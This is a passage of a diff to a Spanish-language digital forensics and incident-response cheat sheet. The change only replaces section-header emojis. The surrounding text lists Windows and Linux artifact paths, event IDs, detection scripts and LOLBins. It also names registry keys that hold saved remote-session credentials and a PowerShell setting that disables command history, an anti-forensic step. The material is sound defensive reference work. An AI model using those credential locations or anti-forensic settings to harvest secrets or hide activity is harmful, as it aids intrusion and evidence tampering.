-eu23r8hq0F-NoZAlKId3_wA9zfu8?type=png)](https://mermaid.live/edit#pako:eNp9VU1vEzEQ_SvWnrbSFpSGUw9U2aQSSAUVWi4ol4k9SQ1ee-uPQqj6Y3rsgVN_ABL7xxjvRxoSt3tK1jPjN2_em73NuBGYHWdLZX7wK7CenX2ea0bPJP_751NoHtgVsBocCHNy0J305-zw8C0rRxQ2YddBNg-awRK5hyGuHPUhk_yLC2Clcex1nz08XEnUHhMHRsHCWLrWotsUHC4tB3ACubSK8tc7-W2N5rEyT2jKPnmanzpvweNKAhVIJZoqaMmBy-ZR73RzlF80j8oksiQ1YjVUsaEEVdNI1SW1i8xijZYHJ40m6P9XUriC2JDZI0QTaO5DPB2amo760pN8arQLyoONkQl0ztTGeuzqb9IHaGV-3jxYIUXLiABvXKIGoXZGRwA79x9Ra6eOBU3ZSvoUO9cBWW0EVMnKAnXQXILddHbUV57k74w2tmDn1tQSBYhnqFfYklPEP5a4pdEViVD86Y3tT9HzV7v3RWldohYWI9KIer_GitQsiGm8kQScYCfJAgtkHo6WKXih5aeOO4FOx9F6F7BoAQgCmtSowxcqlPlEN_dKOunYkhykKfowKXTtSVO9aIJOzzwOtK9CN21rejbKzwikQ3sjefT3rg0JgMeK-OlWgzCDcmadcmY0X3Jjc6_ZAr6ldKMDkltNp38zKJfyuvxxuUUWDIso1YaQlsE6kMLXz9vjZK_-tNNDW98iD-SAZ6cdMVIoCUMlRcqjXLYuGU-7S95MaKn8Lja97ufSEqzJ4LBQcezs_WVaEVFujINdmb0ryvyjKTYDb9lSL6wJsgktM7M7rbKdt-_5SLor7kAlf23PutflbNyuqQ2A9KIi7mprbhBp9R9kRVahrUAK-kjdxuB55q-wwnl2TD_JhN_n2VzfURwEby7WmmfHZH8sslDTGsOZhJWFanhJKiD7f-g-eu23r8hq0F-NoZAlKId3_wA9zfu8)
 
-### ▶️ Ciclo de vida - Respuesta a Incidentes
+### 📜 Ciclo de vida - Respuesta a Incidentes
 
 [![](https://mermaid.ink/img/pako:eNpFkMFqwzAMhl_F6JRB8gI5DNokhUILpbsNX4SttGaJbVSZMUqfao-wF5vrkewmPn1C0n8HEyxBC-MUPs0VWdThrP2mOjFFZDTu59u_ZKCa5lVtq70lL250Zu1sS6eruuCF_EK7QvtqYEa72CqooxN3WWf7Yg3VmUyK9L9tKHz35BidpGmdP4WbNPu85nkHZXVX1A3UMBPP6Gz-5a69UhrkSjNpaHNpkT80aP_IHiYJb1_eQCucqIYULQr1Di-MM7QjTrdMyToJfPwLp2RUQ0T_HsLiPH4Bf1ptrQ?type=png)](https://mermaid.live/edit#pako:eNpFkMFqwzAMhl_F6JRB8gI5DNokhUILpbsNX4SttGaJbVSZMUqfao-wF5vrkewmPn1C0n8HEyxBC-MUPs0VWdThrP2mOjFFZDTu59u_ZKCa5lVtq70lL250Zu1sS6eruuCF_EK7QvtqYEa72CqooxN3WWf7Yg3VmUyK9L9tKHz35BidpGmdP4WbNPu85nkHZXVX1A3UMBPP6Gz-5a69UhrkSjNpaHNpkT80aP_IHiYJb1_eQCucqIYULQr1Di-MM7QjTrdMyToJfPwLp2RUQ0T_HsLiPH4Bf1ptrQ)
 
@@ -184,7 +184,7 @@ Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense
 
 - Referencia - Cuestionario inicial de respuesta a incidentes (INCIBE): https://www.incibe.es/sites/default/files/contenidos/JuegoRol/juegorol_cuestionarioinicialrespuestaincidentes.pdf
 
-### ▶️ Preguntas - Respuesta a Incidentes
+### 📜 Preguntas - Respuesta a Incidentes
 
 **`¿Quién?, ¿Qué?, ¿Dónde?, ¿Cuándo?, ¿Cómo o en qué? y ¿Por qué?`**
 
@@ -266,7 +266,7 @@ Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense
   </tbody>
 </table>
 
-### ▶️ Preguntas - Análisis Forense Digital
+### 📜 Preguntas - Análisis Forense Digital
 
  - ¿Dónde se encuentra físicamente la información?.
  - Qué dispositivos de almacenamiento copiar.
@@ -277,7 +277,7 @@ Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense
  - Necesidad de soporte de un especialista forense.
  - Necesidad de un fedatario.
 
-### ▶️ Metodología - Análisis Forense Digital
+### 📜 Metodología - Análisis Forense Digital
 
 Resumen de operativa de las cinco fases de un Análisis Forense en la adquisición de evidencias digitales.
 
@@ -317,15 +317,15 @@ Donde se generan al menos un informe ejecutivo y otro técnico recogiendo las co
 
 - Referencia - Electronic evidence - A basic guide for First Responders - ENISA: https://www.enisa.europa.eu/publications/electronic-evidence-a-basic-guide-for-first-responders/at_download/fullReport.
 
-## ✅ Windows
+## 📁 Windows
 
-### ▶️ Logs de eventos de Windows
+### 📜 Logs de eventos de Windows
 
 | File Path | Info | Evidencias |
 |-----------|------|------------|
 | `%SYSTEMROOT%\System32\config` `%SYSTEMROOT%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |
 
-### ▶️ Logs de registros sobre instalaciones de Windows
+### 📜 Logs de registros sobre instalaciones de Windows
 
 | File Path | Info | Evidencias |
 |-----------|------|------------|
@@ -345,7 +345,7 @@ Donde se generan al menos un informe ejecutivo y otro técnico recogiendo las co
 | `%ProgramData%\Microsoft\Windows Defender\Scans\Scans\History` | Cuando se detecta una amenaza, WD almacena un archivo binario "DetectionHistory" | Se pueden analizar estos archivos utilizando herramientas como DHParser |
 | `%TMP%` o `%TEMP%` | Variable de entorno que apunta a la ruta absoluta "%USERPROFILE%\AppData\Local\Temp" donde se almacenan ficheros temporales en el contexto de usuario. Este directorio almacena la creación de archivos de volcado de un proceso cuando se realiza a través del taskmanager. En el contexto de sistema apunta a la ruta absoluta "C:\Windows\Temp" |
 
-### ▶️ Lista de Events ID de Windows y Sysmon relevantes en investigaciones DFIR
+### 📜 Lista de Events ID de Windows y Sysmon relevantes en investigaciones DFIR
 
 Los sistemas Windows almacenan los registros en el directorio `%SystemRoot%\System32\winevt\logs` por defecto en el formato binario XML Windows Event Logging, designado por la extensión .evtx. Los registros también se pueden almacenar de forma remota mediante suscripciones de registro. Los eventos pueden registrarse en los registros de eventos de Seguridad, Sistema y Aplicación. 
 
@@ -674,7 +674,7 @@ El registro de eventos de instalación registra las actividades que se produjero
 18: Cambio de ruta de acceso de archivo. Puede indicar cambios en la ubicación de archivos sospechosos.
 ```
 
-### ▶️ Artefactos de Tareas programadas en Windows
+### 📜 Artefactos de Tareas programadas en Windows
 
 Distintas formas de poder visualizar y/o extraer información de las tareas programadas creadas en Windows.
 
@@ -715,7 +715,7 @@ CMD
 schtasks
 ```
 
-### ▶️ Scripts para detectar actividades sospechosas en Windows
+### 📜 Scripts para detectar actividades sospechosas en Windows
 
 `Inicios de sesión remotos`
 
@@ -796,7 +796,7 @@ Una forma de detectar servicios de manipulación mediante la línea de comandos 
 Get-SysmonEvents 1 | Where-Object { $_.Properties[4].Value -match "\\sc.exe" } | Format-List TimeCreated, @{label = "ParentImage" ; Expression = {$_.properties[20].value}}, @{label= "Image" ; Expression= {$_.properties[4].value}},@{label = "CommandLine" ; Expression = {$_.properties[10].value}}
 ```
 
-### ▶️ Obtener software instalado y sus versiones (x86 y x64)
+### 📜 Obtener software instalado y sus versiones (x86 y x64)
 
 Consultando el registro de Windows. Efectivo y completo, donde se lista software instalado en arquitecturas x86 y x64 (Wow6432Node), tanto a nivel general del equipo (HKLM) como en el contexto del perfil de usuario (HKCU).
 ```ps
@@ -813,7 +813,7 @@ Get-WmiObject -Query "SELECT * FROM Win32_Product" | Select-Object Name, Version
 Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor, InstallDate
 ```
 
-### ▶️ Análisis y artefactos de ShellBags
+### 📜 Análisis y artefactos de ShellBags
 
 Shellbags son un conjunto de claves del registro que contienen detalles sobre la carpeta vista de un usuario, como su tamaño, posición e icono. Proporcionan marcas de tiempo, información contextual y muestran el acceso a directorios y otros recursos, lo que podría apuntar a evidencia que alguna vez existió. 
 
@@ -860,7 +860,7 @@ Descripción de valores relevantes:
 
 -  **ShellBags Explorer** (GUI) o **SBECmd** (CLI): https://ericzimmerman.github.io/#!index.md
 
-### ▶️ Detectar peristencia de ejecutables en el registro de Windows (técnicas basadas en la matriz de *MITRE ATT&CK*)
+### 📜 Detectar peristencia de ejecutables en el registro de Windows (técnicas basadas en la matriz de *MITRE ATT&CK*)
 
 Detectar persistencia en claves del registro de Windows haciendo uso de comprobaciones de técnicas basadas en la matriz de *MITRE ATT&CK*.
 
@@ -938,7 +938,7 @@ HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders - St
 > 
 > Claves predefinidas y tipos de datos: https://learn.microsoft.com/es-es/troubleshoot/windows-server/performance/windows-registry-advanced-users
 
-### ▶️ Artefactos de conexiones de clientes VPN
+### 📜 Artefactos de conexiones de clientes VPN
 
 Revisar posibles artefactos de conexiones de clientes VPN realizadas desde un PC comprometido por un actor malicioso.
 
@@ -946,7 +946,7 @@ Revisar posibles artefactos de conexiones de clientes VPN realizadas desde un PC
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
 ```
 
-### ▶️ Persistencia en servicios
+### 📜 Persistencia en servicios
 
 Rama del registro donde se almacenan los valores de imagen de un controlador en un servicio. Usado a veces para mantener persistencia en el sistema.
 
@@ -955,7 +955,7 @@ Analizar ruta y parámetros del valor *"ImagePath"*.
 HKLM\SYSTEM\CurrentControlSet\Services
 ```
 
-### ▶️ ¿Han eliminado el registro de eventos de Windows?
+### 📜 ¿Han eliminado el registro de eventos de Windows?
 
 ¿Los atacantes eliminaron todos los registros de eventos de Windows?
 
@@ -977,7 +977,7 @@ Get-ChildItem -Path F:\pid\ -Include *.evtx -Recurse | Copy-Item -Destination .\
 
 - Volatility - Referencia evtlogs: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#evtlogs
 
-### ▶️ Volatility: clipboard
+### 📜 Volatility: clipboard
 
 Desde un volcado de memoria, los datos del portapapeles pueden se interesantes para revelar información.
 ```
@@ -985,7 +985,7 @@ volatility.exe -f memdump.bin --profile=Win10x64_10586 clipboard
 ```
 - Referencia: https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf
 
-### ▶️ Artefactos Adobe Acrobat: Caché de historial de PDFs abiertos recientemente
+### 📜 Artefactos Adobe Acrobat: Caché de historial de PDFs abiertos recientemente
 
 *cRecentFiles*: Historial de ubicaciones donde se encuentras los ficheros abiertos recientemente, "cX" donde X será un número asignado.
 ```
@@ -1005,7 +1005,7 @@ HKEY_CURRENT_USER\Software\Adobe\Adobe Acrobat\DC\SessionManagement\cWindowsPrev
 HKEY_USERS\<SID-USER>\Software\Adobe\Adobe Acrobat\DC\SessionManagement\cWindowsPrev\cWin0\cTab0\cPathInfo
 ```
 
-### ▶️ Ventana "Ejecutar" y barra direcciones de Explorer.exe: Caché de historial de ficheros y paths visitados recientemente 
+### 📜 Ventana "Ejecutar" y barra direcciones de Explorer.exe: Caché de historial de ficheros y paths visitados recientemente 
 
 Cuando escribimos nuevas rutas o ficheros a través de la barra de direcciones de un Explorador de Windows o en una vetana "Ejecutar" (Win+R). Por defecto estos se quedan almacenados con la intención de agilizar la experiencia de usuario. Estos artefactos pueden ser útiles en una recabación de información para una investigación forense con el fin de conocer los sitios, direcciones o ficheros que el usuario visitó con una salida exitosa.
 
@@ -1023,13 +1023,13 @@ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
 HKEY_USERS\<SID-USER>\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
 ```
 
-### ▶️ Thumbcache Viewer
+### 📜 Thumbcache Viewer
 
 Visualizar ficheros *"thumbcache_\*.db"*.
 
 - https://thumbcacheviewer.github.io
 
-### ▶️ Historial de pestañas sin cerrar de Notepad.exe (Win11)
+### 📜 Historial de pestañas sin cerrar de Notepad.exe (Win11)
 
 Historial de pestañas sin cerrar de Notepad.exe en Windows 11.
 
@@ -1037,7 +1037,7 @@ Historial de pestañas sin cerrar de Notepad.exe en Windows 11.
 "%localappdata%\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState"
 ```
 
-### ▶️ Artefáctos forenses en AnyDesk, Team Viewer y LogMeIn 
+### 📜 Artefáctos forenses en AnyDesk, Team Viewer y LogMeIn 
 
 `AnyDesk`
 
@@ -1096,7 +1096,7 @@ SOFTWARE\LogMeIn\V5
 SOFTWARE\LogMeIn Ignition
 ```
 
-### ▶️ Sesiones de conexión remota almacenadas con PuTTY, MobaXterm, WinSCP (SSH, RDP, FTP, SFTP, SCP u otras)
+### 📜 Sesiones de conexión remota almacenadas con PuTTY, MobaXterm, WinSCP (SSH, RDP, FTP, SFTP, SCP u otras)
 
 Claves de registro y paths de Windows donde se pueden encontrar sesiones guardas y previamente establecidas de conexiones SSH, RDP, FTP, SFTP, SCP, etc. usando *MobaXterm*, *PuTTY* o *WinSCP*. Se trata de valores de cadena tipo REG_SZ donde se almacena información como los usuarios, IPs y la password cifrada en caso de ser guardada en estos clientes usados para establecer conexiones remotas.
 
@@ -1116,7 +1116,7 @@ HKCU\Software\SimonTatham\PuTTY\Sessions
 HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
 ```
 
-### ▶️ Conocer la URL de descarga de un archivo (ADS Zone.Identifier)
+### 📜 Conocer la URL de descarga de un archivo (ADS Zone.Identifier)
 
 Saber si un archivo malicioso se descargó de Internet y desde que URL o se creó en el sistema local.
 
@@ -1132,7 +1132,7 @@ CMD
 notepad <FileName>:Zone.Identifier
 ```
 
-### ▶️ Modificar y detectar Timestamps modificados en ficheros analizando sus metadatos (intento anti-forense)
+### 📜 Modificar y detectar Timestamps modificados en ficheros analizando sus metadatos (intento anti-forense)
 
 Es posible que un actor malicioso o un insider intente modificar las marcas de tiempo de un fichero para modificar su fecha y hora de creación, modificación y acceso con la finalidad de realizar "técnicas anti-forense" para intentar confundir, alterar y dilatar una posible investigación forense.
 
@@ -1240,7 +1240,7 @@ Es posible obtener los metadatos del propio archivo y comprobar los timestamps o
 7. También en las pestañas: "File Metadata" y "Analysis Results".
 8. Si se trata de un fichero ofimático o pdf se añadirá un nuevo desplegadable "Data Artifacts > Metadata" donde también podemos visualizar los timestamps originales.
 
-### ▶️ PSReadLine: Historial de comandos ejecutados en una consola PowerShell
+### 📜 PSReadLine: Historial de comandos ejecutados en una consola PowerShell
 
 El historial de comandos en PowerShell o PowerShell Core no está integrado en el marco de administración de Windows, sino que se basa en el módulo **PSReadLine**. El módulo PSReadLine en Windows se encuentra en la carpeta `C:\Program Files\WindowsPowerShell\Modules\PSReadline` y se importa automáticamente cuando inicia la consola PowerShell.
 
@@ -1303,7 +1303,7 @@ Deshabilitar completamente el almacenamiento del historial de comandos de PowerS
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 ```
 
-### ▶️ Caché almacenada de conexiones establecidas a otros hosts vía RDP
+### 📜 Caché almacenada de conexiones establecidas a otros hosts vía RDP
 
 Si el equipo afectado a sido comprometido y a través de este se hizo un uso como "equipo puente" en movimientos laterales, etc. Puede resultar útil comprobar la caché almacenada de conexiones establecidas vía RDP hacia otros hosts ya sea de la misma red o de un RDP externo con el objetivo por ejemplo de exfiltrar información hacia un stage controlado por el actor malicioso.
 
@@ -1318,7 +1318,7 @@ Situado en la misma ruta, se puede ver la clave "Default". Esta clave nos indica
 HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
 ```
 
-### ▶️ Artefactos forense - MS Word
+### 📜 Artefactos forense - MS Word
 
 `Eventos de alertas MS Office`
 
@@ -1388,13 +1388,13 @@ Los archivos adjuntos tipo Word abiertos en directamente a través de en Outlook
 %LocalAppdata%\Microsoft\Windows\INetCache\Content.Outlook\<Folder>\
 ```
 
-### ▶️ Análisis de malware en ficheros XLSX (MS Excel)
+### 📜 Análisis de malware en ficheros XLSX (MS Excel)
 
 Con 7Zip podemos descomprimir el fichero .xlsx, dentro de la carpeta "XL" abrir editando el archivo llamado "workbook.xml", buscar el término **"absPath"**. Contiene la última ubicación de guardado del archivo donde veríamos al autor (C:\\<\user>\\..\\file.xlsx) que puede ser el usuario del equipo víctima.
 
 Como técnica anti forense esta metadata se puede eliminar desde Excel "inspeccionando el documento" y borrando las "propiedades de documento e información personal".
 
-### ▶️ Análisis de malware en ficheros MS Office (oletools)
+### 📜 Análisis de malware en ficheros MS Office (oletools)
 
 [**oletools**](https://github.com/decalage2/oletools) es un kit de herramientas python para analizar archivos Microsoft OLE2 (también llamados Structured Storage, Compound File Binary Format o Compound Document File Format), como documentos ofimáticos de Microsoft Office, mensajes de Outlook, Word, Power Point, Excel, etc. Principalmente para análisis de malware, forense y depuración. Se basa en el analizador sintáctico [olefile](https://www.decalage.info/olefile). 
 
@@ -1421,7 +1421,7 @@ Como técnica anti forense esta metadata se puede eliminar desde Excel "inspecci
 | [**oledir**](https://github.com/decalage2/oletools/wiki/oledir) | Muestra todas las entradas de directorio de un archivo OLE. |
 | [**olemap**](https://github.com/decalage2/oletools/wiki/olemap) | Pinta una tabla con todos los sectores, y sus atributos, del fichero OLE. |
 
-### ▶️ Herramientas de análisis en ficheros MS Office y otros (detectar malware o phising)
+### 📜 Herramientas de análisis en ficheros MS Office y otros (detectar malware o phising)
 
 | Herramienta | Descripción |
 |-------------|-------------|
@@ -1433,7 +1433,7 @@ Como técnica anti forense esta metadata se puede eliminar desde Excel "inspecci
 | [**Hachoir-subfile**](https://hachoir.readthedocs.io/en/latest/subfile.html) | Herramienta basada en hachoir-parser para buscar subarchivos en cualquier flujo binario. |
 | [**xxxswfpy**](https://hooked-on-mnemonics.blogspot.com/2011/12/xxxswfpy.html) | Escanear, comprimir, descomprimir y analizar archivos Flash SWF. |
 
-### ▶️ Herramientes de análisis PDF (detectar malware o phising)
+### 📜 Herramientes de análisis PDF (detectar malware o phising)
 
 | Herramienta | Descripción |
 |-------------|-------------|
@@ -1485,7 +1485,7 @@ Descifrar infile.pdf usando la contraseña para crear outfile.pdf.
 qpdf --password=pass --decrypt infile.pdf outfile.pdf
 ```
 
-### ▶️ Identificar Shellcodes en ficheros y otros comandos de análisis
+### 📜 Identificar Shellcodes en ficheros y otros comandos de análisis
 
 | Herramienta | Descripción | Ejemplo uso |
 |-------------|-------------|-------------|
@@ -1495,24 +1495,24 @@ qpdf --password=pass --decrypt infile.pdf outfile.pdf
 | [base64dump.py](https://blog.didierstevens.com/2017/07/02/update-base64dump-py-version-0-0-7/) | Enumera las cadenas codificadas en Base64 presentes en el archivo file.txt. | base64dump.py file.txt |
 | [numbers-to-string.py](https://videos.didierstevens.com/2016/10/11/maldoc-numbers-to-string-py/) | Convierte números que representan caracteres en un archivo en una cadena. | numbers-to-string.py file |
 
-### ▶️ Detectar URL maliciosas en el documento
+### 📜 Detectar URL maliciosas en el documento
 
 Para buscar la existencia de estas URL, abrimos el documento con la herramienta 7zip y vamos a ir extrayendo los archivos que contiene. Partimos por extraer archivos como "**document.xml.res**" o "**webSettings.xml.res**" buscando tags o atributos como: **sourceFileName**, **attachedTemplate**, **Target**, **TargetMode**.
 
 También buscamos alguna URL que sea distinta a las oficiales de Microsoft. Ejemplo de URL oficiales pueden ser http://schemas.openxmlformats.org/, http://schemas.microsoft.com/
 
-### ▶️ Asignación de IPs en equipos
+### 📜 Asignación de IPs en equipos
 
 En un incidente se descubre que se envió un paquete de red mal formado desde una dirección IP, pero el atacante elimina dicho registro. Se puede consultar la siguiente subclave del registro para encontrar el equipo en la red que tenía esa dirección IP. Cada subclave tendrá un registro DHCP con los valores DhcpIPAddress, DhcpNameServer, etc.
 ```
 HKLM\SYSTEM\ControlSet00*\Services\Tcpip\Parameters\Interfaces
 ```
 
-### ▶️ Windows Firewall (wf.msc): Reglas residuales de software desintalado
+### 📜 Windows Firewall (wf.msc): Reglas residuales de software desintalado
 
 Comprobar las reglas de entrada y salida en Windows Firewall **"wf.msc"**. Un actor malicioso podría haber instalado software que creó reglas de firewall. La mayoría de las aplicaciones no borran estas reglas, incluso cuando se desinstala.
 
-### ▶️ Persistencia: suplantación de procesos del sistema
+### 📜 Persistencia: suplantación de procesos del sistema
 
 Detección de 2 procesos con el mismo PID pero diferentes direcciones de memoria, podría indicar un proceso de inyección malicioso. 
 
@@ -1526,7 +1526,7 @@ Algunos ejemplos en procesos conocidos.
 | rundll32.exe | 5287 | 0xa90000 |
 | rundll32.exe | 5287 | 0x6a1000 |
 
-### ▶️ Herramientas para consultar y auditar: GPOs, control de accesos, usuarios, grupos y otros funciones de Active Directory y LDAP
+### 📜 Herramientas para consultar y auditar: GPOs, control de accesos, usuarios, grupos y otros funciones de Active Directory y LDAP
 
 La forma más limpia y sencilla de **realizar un backup o export de las políticas locales** (GPOs locales) de un equipo.
 
@@ -1542,11 +1542,11 @@ Una vez los tengamos aislados poder reemplazarlo en una nueva imagen de sistema 
 | `Nettools` | Consultar múltiples funciones de AD | https://nettools.net/download |
 | `Ping Castle` | Auditoría de seguridad general del estado de AD. Útil para analizar herencias o nuevas membresías a grupos privilegiados | https://pingcastle.com/download |
 
-### ▶️ Análisis de phishing mails (extensión .eml) 
+### 📜 Análisis de phishing mails (extensión .eml) 
 
 - SysTools EML Viewer Tool: https://www.systoolsgroup.com/eml-viewer.html
 
-### ▶️ MUICache: artefactos sobre aplicaciones
+### 📜 MUICache: artefactos sobre aplicaciones
 MUICache es un recurso de Windows que actúa como una clave de registro que se encarga de almacenar información sobre el ejecutable de cada aplicación y que el sistema operativo extrae automáticamente cuando se utiliza una nueva aplicación. MUICache tiene la característica de que incluso si eliminas algunos elementos, volverán a aparecer la próxima vez que ejecutes esa aplicación.
 
 ```
@@ -1556,7 +1556,7 @@ HKEY_USERS\<SID_USER>_Classes\Local Settings\Software\Microsoft\Windows\Shell\Mu
 
 - Tool GUI - MUICacheView: https://www.nirsoft.net/utils/muicache_view.html
 
-### ▶️ FeatureUsage: reconstruir las actividades de los usuarios
+### 📜 FeatureUsage: reconstruir las actividades de los usuarios
 Realiza un seguimiento de los eventos asociados con la barra de tareas, por ejemplo, cuando un usuario ejecuta una aplicación anclada a ella. Los artefactos *FeatureUsage* se encuentran en el archivo de registro NTUSER.DAT con la siguiente clave.
 
 ```
@@ -1570,7 +1570,7 @@ AppSwitched: Esta subclave registra los clics izquierdos en las aplicaciones de 
 - **ShowJumpView**: Esta subclave rastrea los clics derechos en las aplicaciones de la barra de tareas.
 - **TrayButtonClicked**: Esta subclave rastrea los clics izquierdos en los siguientes elementos de la barra de tareas: botón Reloj, botón Inicio, botón Centro de notificaciones y cuadro de búsqueda, pudiendo ver los clics en cada elemento.
 
-### ▶️ MRU (Most Recently Used): Artefactos de Office local y Office 365
+### 📜 MRU (Most Recently Used): Artefactos de Office local y Office 365
 **MRU** (Most Recently Used o Usado más recientemente): muestran a través del registro de Windows la lista de archivos abiertos recientemente por el usuario usados en las aplicaciones de Office, facilitando al usuario el poder elegir de esta lista en lugar de navegar a la carpeta origen donde está ubicado. 
 
 - En una investigación general, conocer qué documentos abrió recientemente el usuario puede revelar para qué se utilizó el equipo afectado.
@@ -1593,7 +1593,7 @@ HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Reading Locations\Document
 
 - Tool GUI - RecentFilesView: https://www.nirsoft.net/utils/recent_files_view.html
 
-### ▶️ Ver el úlimo fichero descomprimido 7-Zip
+### 📜 Ver el úlimo fichero descomprimido 7-Zip
 La siguiente ruta muestra la ruta y confirma el último fichero descomprimido usando 7-Zip. 
 
 Si en una investigación forense se sospecha de que el origen de ejecución de un fichero malioso se escondía detrás de otro fichero comprimido enviado vía correo, descargado y descomprimido en local, podemos utilizar esta info como artefacto de confirmación e indicativo de la acción en el equipo ejecutado por parte del usuario víctima.
@@ -1603,7 +1603,7 @@ HKEY_USERS\<SID_USER>\Software\7-Zip\FM
 ```
 - Valor **PanelPath0**: Este valor muestra la ruta del último fichero descomprimido usando 7-Zip.
 
-### ▶️ LOLBins comunes y sus artefactos
+### 📜 LOLBins comunes y sus artefactos
 
 **LOLBins** (Living Off the Land Binaries) son principalmente ficheros ejecutables, scripts o librerías legítimas que ya están presentes en un sistema operativo y que los atacantes pueden llegar a utilizar con fines maliciosos para los que originalmente no fueron diseñados para esos usos. 
 
@@ -1685,9 +1685,9 @@ Referencias:
 
 **`shell32.exe`**: Biblioteca de Windows que contiene funciones usadas para abrir programas y archivos, susceptible a ser explotada para ejecutar comandos arbitrarios.
 
-## ✅ Linux
+## 📁 Linux
 
-### ▶️ Logs del sistema de Linux
+### 📜 Logs del sistema de Linux
 
 Estos ficheros de logs pueden variar, existir o no dependiendo del tipo de distribución del sistema Linux.
 
@@ -1724,7 +1724,7 @@ Estos ficheros de logs pueden variar, existir o no dependiendo del tipo de distr
 | `/var/log/alternatives.log` | Registra todas las operaciones relacionadas con el sistema de alternativas. Por lo tanto, todas las acciones que realicemos usando el comando update-alternatives se registrarán en este log. El sistema de alternativas permite definir nuestro editor de texto predeterminado, el entorno de escritorio predeterminado, la versión de java que queremos usar por defecto, etc. |
 | `/var/log/Xorg.0.log` | Registra la totalidad de eventos relacionados con nuestra tarjeta gráfica desde que arrancamos el ordenador hasta que lo apagamos. Por lo tanto puede ayudar a detectar problemas con nuestra tarjeta gráfica. |
 
-### ▶️ Logs de aplicaciones de Linux
+### 📜 Logs de aplicaciones de Linux
 
 | File Path | Info |
 |-----------|------|
@@ -1745,7 +1745,7 @@ Estos ficheros de logs pueden variar, existir o no dependiendo del tipo de distr
 | `/var/log/openvpn-status.log` | Contiene información de los usuarios conectados al servidor OpenVPN. Ejemplos de la información que contiene es la IP de cada uno de los usuarios, la cuenta de usuario con que se ha conectado una determinada IP, la hora en que cada usuario ha iniciado la conexión, etc. |
 | `/var/log/letsencrypt/letsencrypt.log` | Contiene todo tipo de información acerca de los certificados de Let's Encrypt. Por ejemplo si se han producido errores en la renovación de los certificados. |
 
-### ▶️ Logs journalctl (systemd)
+### 📜 Logs journalctl (systemd)
 **Systemd**: es un sistema moderno en Linux que reemplaza a SysV init, mejorando la eficiencia del inicio y administración de servicios. SysV representa tanto al sistema operativo Unix System V como a un estilo de inicio basado en scripts de inicialización tradicionales, "init.d" gestiona servicios en sistemas con este enfoque. Systemd introduce herramientas como "journalctl", permitiendo acceder y analizar eficientemente registros estructurados del sistema.
 
 **Journalctl**: es una herramienta en Linux que trabaja con el registro de systemd, brindando acceso a registros estructurados en el Journal de systemd. Facilita consultas y análisis avanzados de eventos del sistema mediante registros binarios estructurados, en contraste con los registros de texto plano tradicionales.
@@ -1924,7 +1924,7 @@ Mostrar cambios en cronjobs.
 journalctl /usr/sbin/cron
 ```
 
-### ▶️ Copiar un binario malicioso ya eliminado a través de su proceso todavía en ejecución 
+### 📜 Copiar un binario malicioso ya eliminado a través de su proceso todavía en ejecución 
 
 Aunque se elimne el binario del proceso del malware, todavía está en el espacio del kernel. Por lo tanto, se puede usar el comando *scp* para copiar directamente un binario de proceso sospechoso de Linux.
 
@@ -1932,7 +1932,7 @@ Aunque se elimne el binario del proceso del malware, todavía está en el espaci
 scp /proc/<PID>/exe user@ip:/recovered_binary
 ```
 
-### ▶️ Identificar y obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)
+### 📜 Identificar y obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)
 
 Se conectaron al sistema a través de SSH e iniciaron procesos maliciosos. Incluso, si eliminaron el historial de comandos.
 
@@ -1942,7 +1942,7 @@ Esta es una forma de obtener archivos con PID de procesos maliciosos (similar a 
 grep -l SSH_C /proc/*/environ
 ```
 
-### ▶️ Recopilar información en un primer análisis de respuesta a incidentes (sistema Linux)
+### 📜 Recopilar información en un primer análisis de respuesta a incidentes (sistema Linux)
 
 Buscar archivos legibles en el directorio /etc/.
 ```bash
@@ -2075,21 +2075,21 @@ who
 w
 ```
 
-### ▶️ Historial de comandos de la Shell de Linux (.bash_history & .zsh_history)
+### 📜 Historial de comandos de la Shell de Linux (.bash_history & .zsh_history)
 
 Realizar un backup del historial de comandos ejecutados por todos los usuarios del sistema, incluido el usuario /root, donde están creados los ficheros: `.bash_history` o `.zsh_history`.
 ```bash
 for i in /home/* /root; do [ -d "$i" ] && { [ -s "$i"/.bash_history ] || [ -s "$i"/.zsh_history ]; } && { [ -f "$i"/.bash_history ] && cat "$i"/.bash_history || true; [ -f "$i"/.zsh_history ] && cat "$i"/.zsh_history || true; } > "$(basename "$i")_history_backup.txt"; done
 ```
 
-### ▶️ Voldado de todos los directorios y ficheros de Linux 
+### 📜 Voldado de todos los directorios y ficheros de Linux 
 
 ```bash
 find / -type f 2> /dev/null > dump_sys_files.txt
 find / -type d 2> /dev/null > dump_sys_dirs.txt
 ```
 
-### ▶️ Volcado de Memoria RAM en Linux con LiME (Linux Memory Extractor)
+### 📜 Volcado de Memoria RAM en Linux con LiME (Linux Memory Extractor)
 
 **LiME** es un LKM (Loadable Kernel Module) que permite la adquisición de memoria volátil de Linux y dispositivos basados en Linux como sistemas móviles Android. Permite capturas de memoria más sólidas que otras herramientas desde el punto de vista forense.
 
@@ -2099,13 +2099,13 @@ apt install build-essential linux-headers-(uname -r) ; git clone https://github.
 sudo insmod lime-3.5.0-23-generic.ko "path=/media/Forensics/ram.lime format=lime"
 ```
 
-### ▶️ Comprobar si un usuario ejecutó el comando "sudo"
+### 📜 Comprobar si un usuario ejecutó el comando "sudo"
 
 En un escenario en el que un posible atacante creó un nuevo usuario y eliminó el historial de comandos, pero aún no se puede confirmar si el atacante obtuvo privilegios de root ejecutando el comando "sudo".
 
